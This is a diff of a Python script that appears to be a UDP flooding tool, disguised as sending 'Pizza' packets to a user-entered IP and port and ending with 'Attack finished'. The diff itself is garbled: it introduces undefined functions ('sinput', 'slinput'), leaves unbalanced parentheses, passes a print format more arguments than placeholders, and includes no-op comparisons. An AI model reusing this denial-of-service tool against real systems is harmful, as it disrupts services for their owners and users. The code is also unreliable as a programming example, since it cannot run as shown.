@@ -13,10 +13,10 @@ bytes  = random._urandom(666)
 
 os.system("clear")
 
-ip = str(input("[+] Pizza IP : ")
-port = str(input("[+] Pizza Port : ")
-sent = str(input("[+] Masukan Jumlah Pizza Ke Dalam Box : ")
-random = str(input("[+] Random Tools : ")
+ip = sinput("[+] Pizza IP : ")
+port = input("[+] Pizza Port : ")
+sent = input("[+] Masukan Jumlah Pizza Ke Dalam Box : ")
+random = slinput("[+] Random Tools : ")
 ping = str(input("[+] Jumlah Pizza 1-500000 : ")
 os.system("clear") 
 print("Pergi Ke Toko PizzaHot✓...")
@@ -37,10 +37,6 @@ while True:
         port == 65534
         ping = ping + 1
         ping == 65534
-        random = random + 1
-        random == 404555
-        bytes = bytes + 1
-        bytes == 677543
         print("\033[1;91mSend \033[1;32m%s \033[1;91m Pizza Packet to \033[1;32m%s \033[1;91mPizza port \033[1;32m%s " % (sent, ip, port, random, bytes,))
 
 print("\033[1;92mAttack finished\033[0m")
